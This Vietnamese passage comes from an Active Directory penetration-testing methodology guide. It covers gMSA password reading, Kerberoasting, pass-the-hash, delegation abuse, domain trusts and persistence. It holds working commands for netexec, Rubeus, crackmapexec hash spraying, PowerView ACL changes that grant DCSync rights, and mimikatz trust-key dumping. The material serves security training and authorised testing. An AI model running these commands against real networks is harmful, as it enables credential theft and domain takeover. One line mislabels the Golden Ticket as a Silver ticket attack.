netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Sau đó đánh giá gMSA đã khôi phục như mọi thông tin xác thực khác: kiểm tra tư cách thành viên nhóm cục bộ/miền, quyền đăng nhập, SPN, delegation và các dịch vụ có thể truy cập trước khi thử pass-the-hash. Cách lấy dựa trên ACL này khác với [Golden gMSA/dMSA](golden-dmsa-gmsa.md), vốn suy ra mật khẩu được quản lý sau khi KDS root key bị xâm phạm.<sup>[[20]](#references)</sup>

Một computer principal cũng có thể có quyền kiểm soát outbound đối với các computer object hoặc group khác. Sau khi có được principal này, hãy kiểm tra riêng các membership lồng nhau và ACL hiệu lực của nó: quyền ghi trên một computer object khác có thể cho phép thay đổi tài khoản, còn quyền thành viên nhóm có thể dẫn đến một vai trò đăng nhập. Chỉ riêng cờ staged-account, quy ước đặt tên dễ đoán hoặc cạnh `GenericWrite` không chứng minh được toàn bộ đường tấn công.

Một bản sao có thể đọc được của blob `msDS-ManagedPassword` trong tệp, share hoặc bản sao lưu là một đường lộ lọt riêng: ACL đọc LDAP không thể bảo vệ bản sao được lưu ở nơi khác. Hãy xác thực rằng dữ liệu là blob mật khẩu được quản lý trước khi diễn giải, đồng thời phân biệt trường hợp này với cả việc đọc LDAP được cấp phép lẫn suy ra từ KDS root key.

### Kerberoast

Kerberoasting bao gồm việc lấy **TGS ticket** được các dịch vụ gắn với tài khoản người dùng sử dụng rồi crack mã hóa của chúng—vốn dựa trên mật khẩu người dùng—**offline**.

Tìm hiểu thêm về vấn đề này tại:


{{#ref}}
kerberoast.md
{{#endref}}

### Kết nối từ xa (RDP, SSH, FTP, Win-RM, v.v.)

Sau khi lấy được một số thông tin xác thực, bạn có thể kiểm tra xem mình có quyền truy cập vào **máy** nào không. Để làm việc đó, bạn có thể dùng **CrackMapExec** để thử kết nối đến nhiều máy chủ bằng các giao thức khác nhau, tùy theo kết quả quét cổng.

### Local Privilege Escalation

Nếu bạn đã xâm phạm thông tin xác thực hoặc có phiên làm việc với tư cách người dùng miền thông thường và có thể truy cập **bất kỳ máy nào trong miền**, hãy tìm cách **leo thang đặc quyền cục bộ và thu thập thông tin xác thực**. Đặc quyền quản trị viên cục bộ có thể cho phép bạn **dump hash của người dùng khác** từ bộ nhớ (LSASS) và bộ nhớ lưu trữ cục bộ (SAM).

Cuốn sách này có một trang đầy đủ về [**leo thang đặc quyền cục bộ trong Windows**](../windows-local-privilege-escalation/index.html) và một [**danh sách kiểm tra**](../checklist-windows-privilege-escalation.md). Ngoài ra, đừng quên sử dụng [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Ticket phiên hiện tại

Rất **khó có khả năng** bạn tìm thấy **ticket** trong phiên người dùng hiện tại **cấp cho bạn quyền truy cập** vào các tài nguyên không ngờ tới, nhưng bạn có thể kiểm tra:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Với thông tin đăng nhập domain hoặc một phiên người dùng, hãy xem lại các [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: các kỹ thuật liệt kê và ép xác thực có xác thực có thể làm lộ những đường relay không khả dụng trong quá trình trinh sát không xác thực.

### Tìm Creds trong Computer Shares | SMB Shares

Giờ bạn đã có một số thông tin đăng nhập cơ bản, hãy kiểm tra xem bạn có thể **tìm** được **các tệp đáng chú ý đang được chia sẻ trong AD** hay không. Bạn có thể làm việc này thủ công, nhưng đây là công việc lặp đi lặp lại rất nhàm chán (nhất là khi bạn tìm thấy hàng trăm tài liệu cần kiểm tra).

[**Theo liên kết này để tìm hiểu về các công cụ bạn có thể sử dụng.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Đánh cắp NTLM Creds

Nếu bạn có thể **truy cập các PC hoặc shares khác**, bạn có thể **đặt các tệp** (như tệp SCF) mà nếu được truy cập theo cách nào đó sẽ k**ích hoạt xác thực NTLM nhắm vào bạn** để bạn có thể **đánh cắp** **NTLM challenge** nhằm crack nó:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Lỗ hổng này cho phép bất kỳ người dùng nào đã xác thực **xâm nhập domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Leo thang đặc quyền trên Active Directory KHI CÓ thông tin đăng nhập/phiên đặc quyền

**Đối với các kỹ thuật sau, một domain user thông thường là chưa đủ; bạn cần có một số đặc quyền/thông tin đăng nhập đặc biệt để thực hiện các cuộc tấn công này.**

### Trích xuất hash

Hy vọng bạn đã **xâm nhập được một tài khoản local admin** bằng [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), bao gồm cả relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [leo thang đặc quyền cục bộ](../windows-local-privilege-escalation/index.html).\
Sau đó, đã đến lúc dump tất cả hash trong bộ nhớ và trên máy.\
[**Đọc trang này để tìm hiểu các cách khác nhau để lấy hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Khi đã có hash của một người dùng**, bạn có thể dùng nó để **mạo danh** người dùng đó.\
Bạn cần sử dụng một **công cụ** có thể **thực hiện** **xác thực NTLM bằng** **hash** đó, **hoặc** bạn có thể tạo một **sessionlogon** mới rồi **inject** **hash** đó vào **LSASS**, để hash đó được sử dụng khi thực hiện bất kỳ **xác thực NTLM** nào. Đây là cách mà mimikatz sử dụng.\
[**Đọc trang này để biết thêm thông tin.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cuộc tấn công này nhằm **dùng NTLM hash của người dùng để yêu cầu Kerberos tickets**, như một phương án thay thế cho Pass The Hash thông thường qua giao thức NTLM. Vì vậy, kỹ thuật này có thể đặc biệt **hữu ích trong các mạng đã tắt giao thức NTLM** và chỉ **cho phép Kerberos** làm giao thức xác thực.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Trong phương thức tấn công **Pass The Ticket (PTT)**, kẻ tấn công **đánh cắp ticket xác thực của người dùng** thay vì mật khẩu hoặc giá trị hash của họ. Sau đó, ticket bị đánh cắp này được dùng để **mạo danh người dùng**, qua đó giành quyền truy cập trái phép vào các tài nguyên và dịch vụ trong mạng.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Tái sử dụng thông tin đăng nhập

Nếu bạn có **hash** hoặc **mật khẩu** của một **local admin**, hãy thử **đăng nhập cục bộ** vào các **PC** khác bằng thông tin đó.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Lưu ý rằng việc này khá **ồn ào** và **LAPS** sẽ **giảm thiểu** rủi ro.

### Lạm dụng MSSQL & Trusted Links

Nếu người dùng có quyền **truy cập các instance MSSQL**, họ có thể **thực thi lệnh** trên host MSSQL (nếu chạy với quyền SA), **đánh cắp** **hash** NetNTLM hoặc thậm chí thực hiện **relay attack**.\
Nếu một instance MSSQL được một instance khác tin cậy thông qua database link, người dùng có quyền trên database được liên kết có thể **dùng mối quan hệ tin cậy để thực thi truy vấn trên instance kia**. Có thể xâu chuỗi các mối quan hệ tin cậy này và cuối cùng tiếp cận một database bị cấu hình sai, nơi người dùng có thể thực thi lệnh.\
**Các liên kết giữa database vẫn hoạt động ngay cả qua các forest trust.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Lạm dụng nền tảng quản lý tài sản/triển khai CNTT

Các bộ giải pháp kiểm kê và triển khai của bên thứ ba thường mở ra những cách thức mạnh mẽ để truy cập thông tin xác thực và thực thi mã. Xem:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Nếu bạn tìm thấy bất kỳ đối tượng Computer nào có thuộc tính [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) và có quyền trên domain của máy tính đó, bạn sẽ có thể dump TGT từ bộ nhớ của mọi người dùng đăng nhập vào máy tính.\
Vì vậy, nếu **Domain Admin đăng nhập vào máy tính**, bạn sẽ có thể dump TGT của họ và giả mạo họ bằng [Pass the Ticket](pass-the-ticket.md).\
Nhờ constrained delegation, bạn thậm chí có thể **tự động compromise một Print Server** (hy vọng đó sẽ là một DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Nếu một người dùng hoặc máy tính được phép sử dụng "Constrained Delegation", đối tượng đó có thể **giả mạo bất kỳ người dùng nào để truy cập một số dịch vụ trên máy tính**.\
Sau đó, nếu bạn **compromise hash** của người dùng/máy tính này, bạn sẽ có thể **giả mạo bất kỳ người dùng nào** (kể cả domain admin) để truy cập một số dịch vụ.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Có quyền **WRITE** trên một đối tượng Active Directory của máy tính từ xa cho phép thực thi mã với **đặc quyền nâng cao**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Lạm dụng quyền/ACL

Người dùng bị compromise có thể có một số **quyền đáng chú ý trên một số đối tượng domain**, cho phép bạn **di chuyển ngang**/**leo thang** đặc quyền.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Lạm dụng dịch vụ Printer Spooler

Phát hiện **dịch vụ Spool đang lắng nghe** trong domain có thể bị **lạm dụng** để **thu thập thông tin xác thực mới** và **leo thang đặc quyền**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Lạm dụng phiên của bên thứ ba

Nếu **người dùng khác** **truy cập** vào máy đã bị **compromise**, bạn có thể **thu thập thông tin xác thực từ bộ nhớ** và thậm chí **inject beacon vào các tiến trình của họ** để giả mạo họ.\
Thông thường, người dùng sẽ truy cập hệ thống qua RDP; dưới đây là cách thực hiện một vài attack trên phiên RDP của bên thứ ba:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** cung cấp hệ thống quản lý **mật khẩu Administrator cục bộ** trên các máy tính đã join domain, đảm bảo mật khẩu được **ngẫu nhiên hóa**, là duy nhất và thường xuyên được **thay đổi**. Các mật khẩu này được lưu trong Active Directory và quyền truy cập được kiểm soát bằng ACL, chỉ cấp cho người dùng được ủy quyền. Nếu có đủ quyền truy cập các mật khẩu này, bạn có thể pivot sang những máy tính khác.


{{#ref}}
laps.md
{{#endref}}

### Đánh cắp chứng chỉ

**Thu thập chứng chỉ** từ máy đã bị compromise có thể là một cách để leo thang đặc quyền trong môi trường:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Lạm dụng Certificate Templates

Nếu được cấu hình các **template dễ bị tấn công**, bạn có thể lạm dụng chúng để leo thang đặc quyền:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Hậu khai thác với tài khoản có đặc quyền cao

### Dump thông tin xác thực Domain

Khi có được đặc quyền **Domain Admin**, hoặc tốt hơn là **Enterprise Admin**, bạn có thể **dump** **database domain**: _ntds.dit_.

[**Có thể tìm thêm thông tin về attack DCSync tại đây**](dcsync.md).

[**Có thể tìm thêm thông tin về cách đánh cắp NTDS.dit tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Một bản sao lưu có thể đọc được, chứa `ntds.dit` cùng với hive `SYSTEM`, cần được xem là dữ liệu directory đã bị lộ ngay cả trước khi giải nén. Hash mật khẩu cũ không khiến các thuộc tính khác của đối tượng trở nên an toàn: những trường như `description` có thể chứa thông tin xác thực hoặc ghi chú vận hành. Trước tiên, hãy kiểm tra tên các thành phần trong archive và không đưa nội dung database đã giải nén vào đầu ra liệt kê thông thường.

### Leo thang đặc quyền làm Persistence

Một số kỹ thuật đã thảo luận trước đó có thể được dùng để duy trì quyền truy cập.\
Ví dụ, bạn có thể:

- Khiến người dùng dễ bị [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Khiến người dùng dễ bị [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Cấp quyền [**DCSync**](#dcsync) cho người dùng

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** tạo một **Ticket Granting Service (TGS) ticket hợp lệ** cho một dịch vụ cụ thể bằng cách sử dụng **NTLM hash** (ví dụ: **hash của tài khoản PC**). Phương pháp này được dùng để **truy cập các đặc quyền của dịch vụ**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** xảy ra khi attacker giành được **NTLM hash của tài khoản krbtgt** trong môi trường Active Directory (AD). Tài khoản này đặc biệt vì được dùng để ký tất cả **Ticket Granting Ticket (TGT)**, vốn rất cần thiết cho việc xác thực trong mạng AD.

Sau khi có được hash này, attacker có thể tạo **TGT** cho bất kỳ tài khoản nào họ chọn (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Đây là những ticket tương tự Golden Ticket, được giả mạo theo cách **bypass các cơ chế phát hiện Golden Ticket phổ biến.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Duy trì persistence bằng certificate của tài khoản**

**Có certificate của một tài khoản hoặc có khả năng yêu cầu certificate** là một cách rất hiệu quả để duy trì persistence trong tài khoản người dùng (ngay cả khi người đó đổi mật khẩu):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Duy trì persistence trong domain bằng certificate**

**Cũng có thể dùng certificate để duy trì persistence với đặc quyền cao trong domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Nhóm AdminSDHolder

Đối tượng **AdminSDHolder** trong Active Directory bảo vệ các **nhóm có đặc quyền** (như Domain Admins và Enterprise Admins) bằng cách áp dụng một **Access Control List (ACL)** tiêu chuẩn cho các nhóm này nhằm ngăn chặn những thay đổi trái phép. Tuy nhiên, tính năng này có thể bị khai thác; nếu attacker chỉnh sửa ACL của AdminSDHolder để cấp toàn quyền cho một người dùng thông thường, người dùng đó sẽ có quyền kiểm soát rộng rãi đối với tất cả các nhóm có đặc quyền. Do đó, biện pháp bảo mật vốn nhằm bảo vệ này có thể phản tác dụng, dẫn đến truy cập trái phép nếu không được giám sát chặt chẽ.

[**Tìm hiểu thêm về nhóm AdminDSHolder tại đây.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Thông tin xác thực DSRM

Trong mỗi **Domain Controller (DC)** đều có một tài khoản **local administrator**. Khi có quyền admin trên máy như vậy, có thể trích xuất hash của tài khoản Administrator cục bộ bằng **mimikatz**. Sau đó, cần chỉnh sửa registry để **cho phép sử dụng mật khẩu này**, qua đó cho phép truy cập từ xa vào tài khoản Administrator cục bộ.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Duy trì persistence bằng ACL

Bạn có thể **cấp** một số **quyền đặc biệt** cho **người dùng** trên các đối tượng domain cụ thể, giúp người dùng đó **leo thang đặc quyền trong tương lai**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptor

**Security descriptor** được dùng để **lưu trữ** các **quyền** mà một **đối tượng** có **đối với** một **đối tượng** khác. Chỉ cần **thực hiện** một **thay đổi nhỏ** trong **security descriptor** của một đối tượng, bạn có thể có được các đặc quyền rất đáng kể đối với đối tượng đó mà không cần là thành viên của một nhóm có đặc quyền.


{{#ref}}
security-descriptors.md
{{#endref}}

### Anti-forensics / Evasion bằng Dynamic Object

Lạm dụng auxiliary class `dynamicObject` để tạo các principal/GPO/bản ghi DNS tồn tại trong thời gian ngắn với `entryTTL`/`msDS-Entry-Time-To-Die`; chúng tự xóa mà không để lại tombstone, xóa dấu vết LDAP nhưng vẫn để lại SID mồ côi, tham chiếu `gPLink` bị hỏng hoặc phản hồi DNS được cache (ví dụ: làm nhiễm bẩn ACE của AdminSDHolder hoặc chuyển hướng `gPCFileSysPath`/DNS tích hợp AD độc hại).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Thay đổi **LSASS** trong bộ nhớ để thiết lập một **mật khẩu dùng chung**, cho phép truy cập tất cả tài khoản trong domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Tìm hiểu SSP (Security Support Provider) là gì tại đây.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Bạn có thể tạo **SSP riêng** để **thu thập** **thông tin xác thực** được sử dụng để truy cập máy ở dạng **clear text**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Đăng ký một **Domain Controller mới** trong AD và dùng nó để **đẩy các thuộc tính** (SIDHistory, SPN...) lên các đối tượng được chỉ định mà **không** để lại **log** nào về các **thay đổi**. Bạn **cần có đặc quyền DA** và phải ở trong **root domain**.\
Lưu ý rằng nếu sử dụng dữ liệu sai, các log rất khó xử lý sẽ xuất hiện.


{{#ref}}
dcshadow.md
{{#endref}}

### Duy trì persistence bằng LAPS

Trước đó, chúng ta đã thảo luận cách leo thang đặc quyền nếu bạn có **đủ quyền để đọc mật khẩu LAPS**. Tuy nhiên, các mật khẩu này cũng có thể được dùng để **duy trì persistence**.\
Tham khảo:


{{#ref}}
laps.md
{{#endref}}

## Leo thang đặc quyền trong forest - Domain Trust

Microsoft xem **Forest** là ranh giới bảo mật. Điều này có nghĩa là **xâm nhập một domain có thể dẫn đến nguy cơ toàn bộ Forest bị xâm nhập**.<sup>[[1]](#references)</sup>

### Thông tin cơ bản

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) là một cơ chế bảo mật cho phép người dùng từ một **domain** truy cập tài nguyên trong một **domain** khác. Về cơ bản, cơ chế này tạo liên kết giữa các hệ thống xác thực của hai domain, cho phép quá trình xác minh xác thực diễn ra liền mạch. Khi thiết lập trust, các domain trao đổi và lưu giữ các **key** cụ thể trong **Domain Controller (DC)** của chúng; các key này rất quan trọng đối với tính toàn vẹn của trust.

Trong một tình huống điển hình, nếu người dùng muốn truy cập dịch vụ trong một **trusted domain**, trước tiên họ phải yêu cầu một ticket đặc biệt gọi là **inter-realm TGT** từ DC của domain mình. TGT này được mã hóa bằng **key** dùng chung mà hai domain đã thống nhất. Sau đó, người dùng gửi TGT này đến **DC của trusted domain** để lấy service ticket (**TGS**). Khi DC của trusted domain xác thực thành công inter-realm TGT, nó cấp TGS, cho phép người dùng truy cập dịch vụ.

**Các bước**:

1. Một **máy tính client** trong **Domain 1** bắt đầu quá trình bằng cách sử dụng **NTLM hash** của nó để yêu cầu **Ticket Granting Ticket (TGT)** từ **Domain Controller (DC1)**.
2. DC1 cấp TGT mới nếu xác thực client thành công.
3. Sau đó, client yêu cầu **inter-realm TGT** từ DC1 để truy cập tài nguyên trong **Domain 2**.
4. Inter-realm TGT được mã hóa bằng **trust key** dùng chung giữa DC1 và DC2 trong quan hệ trust hai chiều giữa hai domain.
5. Client gửi inter-realm TGT đến **Domain Controller (DC2) của Domain 2**.
6. DC2 xác minh inter-realm TGT bằng trust key dùng chung và, nếu hợp lệ, cấp **Ticket Granting Service (TGS)** cho server trong Domain 2 mà client muốn truy cập.
7. Cuối cùng, client gửi TGS này đến server. TGS được mã hóa bằng hash tài khoản của server và cho phép truy cập dịch vụ trong Domain 2.

### Các loại trust

Điều quan trọng cần lưu ý là **trust có thể là một chiều hoặc hai chiều**. Với trust hai chiều, cả hai domain đều trust lẫn nhau; còn trong quan hệ trust **một chiều**, một domain là **trusted**, domain còn lại là **trusting**. Trong trường hợp sau, **bạn chỉ có thể truy cập tài nguyên trong trusting domain từ trusted domain**.

Nếu Domain A trust Domain B, A là trusting domain còn B là trusted domain. Ngoài ra, trong **Domain A**, đây sẽ là **Outbound trust**; còn trong **Domain B**, đây sẽ là **Inbound trust**.

**Các quan hệ trust khác nhau**

- **Parent-Child Trusts**: Đây là cấu hình phổ biến trong cùng một forest, trong đó child domain tự động có trust bắc cầu hai chiều với parent domain. Về cơ bản, điều này có nghĩa là các yêu cầu xác thực có thể được chuyển tiếp liền mạch giữa parent và child.
- **Cross-link Trusts**: Còn gọi là “shortcut trusts”, các trust này được thiết lập giữa các child domain để rút ngắn quá trình chuyển tiếp. Trong các forest phức tạp, referral xác thực thường phải đi lên forest root rồi mới đi xuống domain đích. Việc tạo cross-link giúp rút ngắn đường đi, đặc biệt hữu ích trong các môi trường phân bố rộng về địa lý.
- **External Trusts**: Các trust này được thiết lập giữa những domain khác nhau, không liên quan và vốn không có tính bắc cầu. Theo [tài liệu của Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust hữu ích khi cần truy cập tài nguyên trong một domain nằm ngoài forest hiện tại và không được kết nối bằng forest trust. SID filtering giúp tăng cường bảo mật cho external trust.
- **Tree-root Trusts**: Các trust này được tự động thiết lập giữa forest root domain và một tree root mới được thêm vào. Dù không thường gặp, tree-root trust rất quan trọng khi thêm domain tree mới vào forest, cho phép domain đó giữ tên domain riêng và bảo đảm tính bắc cầu hai chiều. Có thể xem thêm trong [hướng dẫn của Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Đây là trust bắc cầu hai chiều giữa hai forest root domain, đồng thời áp dụng SID filtering để tăng cường bảo mật.
- **MIT Trusts**: Các trust này được thiết lập với những domain Kerberos không phải Windows và [tuân thủ RFC4120](https://tools.ietf.org/html/rfc4120). MIT trust chuyên biệt hơn và dành cho các môi trường cần tích hợp với hệ thống dựa trên Kerberos bên ngoài hệ sinh thái Windows.

#### Các khác biệt khác trong **quan hệ trust**

- Quan hệ trust cũng có thể là **bắc cầu** (A trust B, B trust C, vậy A trust C) hoặc **không bắc cầu**.
- Quan hệ trust có thể được thiết lập dưới dạng **trust hai chiều** (hai bên trust lẫn nhau) hoặc **trust một chiều** (chỉ một bên trust bên kia).

### Đường tấn công

1. **Liệt kê** các quan hệ trust
2. Kiểm tra xem có **security principal** nào (user/group/computer) có **quyền truy cập** tài nguyên của **domain khác** hay không, chẳng hạn thông qua các mục ACE hoặc do thuộc nhóm của domain kia. Tìm các **mối quan hệ giữa các domain** (có thể trust được tạo ra chính vì mục đích này).
   1. Trong trường hợp này, kerberoast cũng có thể là một lựa chọn khác.
3. **Xâm nhập** các **tài khoản** có thể **pivot** qua các domain.

Attacker có thể truy cập tài nguyên trong domain khác thông qua ba cơ chế chính:

- **Thành viên nhóm cục bộ**: Principal có thể được thêm vào các nhóm cục bộ trên máy, chẳng hạn nhóm “Administrators” trên server, qua đó có quyền kiểm soát đáng kể đối với máy đó.
- **Thành viên nhóm thuộc domain bên ngoài**: Principal cũng có thể là thành viên của các nhóm trong domain bên ngoài. Tuy nhiên, hiệu quả của phương pháp này phụ thuộc vào loại trust và phạm vi của nhóm.
- **Access Control List (ACL)**: Principal có thể được chỉ định trong **ACL**, đặc biệt là các thực thể trong **ACE** thuộc **DACL**, qua đó được cấp quyền truy cập vào các tài nguyên cụ thể. Nếu muốn tìm hiểu sâu hơn về cơ chế của ACL, DACL và ACE, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” là một tài liệu rất giá trị.<sup>[[17]](#references)</sup>

### Tìm user/group bên ngoài có quyền

Bạn có thể kiểm tra **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** để tìm các foreign security principal trong domain. Đây sẽ là user/group từ **domain/forest bên ngoài**.

Bạn có thể kiểm tra thông tin này trong **Bloodhound** hoặc dùng powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Leo thang đặc quyền trong forest từ Child lên Parent

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Các cách khác để liệt kê quan hệ trust giữa các domain:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Có **2 khóa tin cậy**, một khóa cho _Child --> Parent_ và khóa còn lại cho _Parent_ --> _Child_.\
> Bạn có thể lấy khóa mà miền hiện tại sử dụng bằng:
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Leo thang lên Enterprise admin của domain con/cha bằng cách lạm dụng trust với SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Khai thác Configuration NC có thể ghi

Hiểu cách khai thác Configuration Naming Context (NC) là điều cốt yếu. Configuration NC đóng vai trò là kho lưu trữ trung tâm cho dữ liệu cấu hình trên toàn forest trong môi trường Active Directory (AD). Dữ liệu này được sao chép đến mọi Domain Controller (DC) trong forest, trong đó các DC có thể ghi duy trì một bản sao có thể ghi của Configuration NC. Để khai thác, cần có **đặc quyền SYSTEM trên một DC**, tốt nhất là DC con.

**Liên kết GPO với site của DC gốc**

Container Sites của Configuration NC chứa thông tin về các site của mọi máy tính đã tham gia domain trong forest AD. Với đặc quyền SYSTEM trên bất kỳ DC nào, attacker có thể liên kết GPO với các site của DC gốc. Hành động này có thể xâm phạm domain gốc bằng cách thao túng các chính sách được áp dụng cho những site đó.

Để tìm hiểu chuyên sâu, có thể tham khảo nghiên cứu về [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Xâm phạm bất kỳ gMSA nào trong forest**

Một hướng tấn công là nhắm vào các gMSA có đặc quyền trong domain. KDS Root key, cần thiết để tính mật khẩu của gMSA, được lưu trong Configuration NC. Với đặc quyền SYSTEM trên bất kỳ DC nào, attacker có thể truy cập KDS Root key và tính mật khẩu của mọi gMSA trong forest.

Có thể xem phân tích chi tiết và hướng dẫn từng bước tại:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tấn công MSA được ủy quyền bổ trợ (BadSuccessor – lạm dụng các thuộc tính migration):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Nghiên cứu bên ngoài bổ sung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Tấn công thay đổi Schema**

Phương pháp này đòi hỏi sự kiên nhẫn, chờ các đối tượng AD có đặc quyền mới được tạo. Với đặc quyền SYSTEM, attacker có thể sửa đổi AD Schema để cấp cho bất kỳ người dùng nào toàn quyền kiểm soát mọi class. Điều này có thể dẫn đến việc truy cập và kiểm soát trái phép các đối tượng AD mới được tạo.

Có thể đọc thêm về [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Từ DA lên EA với ADCS ESC5**

Lỗ hổng ADCS ESC5 nhắm vào quyền kiểm soát các đối tượng Public Key Infrastructure (PKI) để tạo certificate template cho phép xác thực với tư cách bất kỳ người dùng nào trong forest. Vì các đối tượng PKI nằm trong Configuration NC, việc xâm phạm một DC con có thể ghi cho phép thực hiện các cuộc tấn công ESC5.

Có thể đọc thêm chi tiết tại [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Trong trường hợp không có ADCS, attacker có thể thiết lập các thành phần cần thiết, như được thảo luận trong [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domain thuộc forest bên ngoài - Một chiều (inbound) hoặc hai chiều

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Trong kịch bản này, **domain của bạn được một domain bên ngoài tin cậy**, qua đó bạn có **các quyền chưa xác định** trên domain đó. Bạn cần tìm **những principal nào trong domain của bạn có quyền truy cập nào trên domain bên ngoài**, sau đó thử khai thác:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain Forest Bên ngoài - Một chiều (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
